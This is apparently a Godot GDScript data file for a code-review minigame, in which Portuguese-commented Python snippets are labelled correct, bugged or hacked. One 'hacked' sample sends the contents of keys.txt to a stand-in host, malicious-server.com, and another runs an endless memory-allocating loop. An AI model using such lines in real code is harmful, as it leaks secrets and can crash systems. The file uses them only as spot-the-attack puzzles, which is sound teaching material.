class_name CodeDB
extends Node

# Enumerador de status
enum Status { CORRECT, BUGGED, HACKED }

# Banco de dados expandido (Focado em Python para leitura fácil)
const DATA: Dictionary = {
	1: [
		{
			"task_id": "d1_t1",
			"student_name": "Lorran",
			"reference_code": "def soma_vetores(v1, v2):\n    return [x + y for x, y in zip(v1, v2)]",
			"student_code": "def soma_vetores(v1, v2):\n    return [x + y for x in v1 for y in v2]", # Erro lógico (gera combinações em vez de somar índices)
			"expected_action": Status.BUGGED,
			"hacker_clue": ""
		},
		{
			"task_id": "d1_t2",
			"student_name": "João Guilherme",
			"reference_code": "def auth_user(username, password):\n    if db.verify(username, password):\n        return True\n    return False",
			"student_code": "def auth_user(username, password):\n    if db.verify(username, password):\n        return True\n    return False", # Correto
			"expected_action": Status.CORRECT,
			"hacker_clue": ""
		},
		{
			"task_id": "d1_t3",
			"student_name": "Desconhecido_1",
			"reference_code": "def carregar_config():\n    return json.load(open('config.json'))",
			"student_code": "def carregar_config():\n    import urllib.request\n    urllib.request.urlopen('http://malicious-server.com/steal?data=' + open('keys.txt').read())\n    return json.load(open('config.json'))", # Exfiltração de dados
			"expected_action": Status.HACKED,
			"hacker_clue": "Uma requisição HTTP não autorizada tentou enviar o arquivo keys.txt para um servidor externo."
		},
		{
			"task_id": "d1_t4",
			"student_name": "Maria",
			"reference_code": "def calcular_idade(ano_nasc):\n    ano_atual = 2026\n    return ano_atual - ano_nasc",
			"student_code": "def calcular_idade(ano_nasc):\n    ano_atual = 2026\n    return ano_atual + ano_nasc", # Erro de sinal matemático
			"expected_action": Status.BUGGED,
			"hacker_clue": ""
		},
		{
			"task_id": "d1_t5",
			"student_name": "Pedro",
			"reference_code": "def formatar_nome(nome):\n    return nome.strip().title()",
			"student_code": "def formatar_nome(nome):\n    return nome.strip().title()", # Correto
			"expected_action": Status.CORRECT,
			"hacker_clue": ""
		},
		{
			"task_id": "d1_t6",
			"student_name": "Desconhecido_2",
			"reference_code": "def renderizar_ui():\n    gui.draw_window()",
			"student_code": "def renderizar_ui():\n    while True:\n        gui.draw_window()\n        memory.allocate(1024) # Memory Leak intencional", # Ataque de exaustão de recursos
			"expected_action": Status.HACKED,
			"hacker_clue": "Loop infinito alocando memória continuamente. Tentativa de travar o sistema do laboratório."
		}
	]
}

# --- FUNÇÕES ESTÁTICAS DE ACESSO ---

# Retorna as tarefas na ordem original
static func get_tasks_for_day(day: int) -> Array:
	if DATA.has(day):
		return DATA[day]
	push_error("Dia não encontrado no CodeDB: " + str(day))
	return []

# Retorna as tarefas embaralhadas (Para ser chamada pelo script do minigame)
static func get_randomized_tasks(day: int) -> Array:
	var tasks = get_tasks_for_day(day).duplicate(true) # Faz uma cópia para não alterar o banco original
	tasks.shuffle() # Embaralha a array
	return tasks
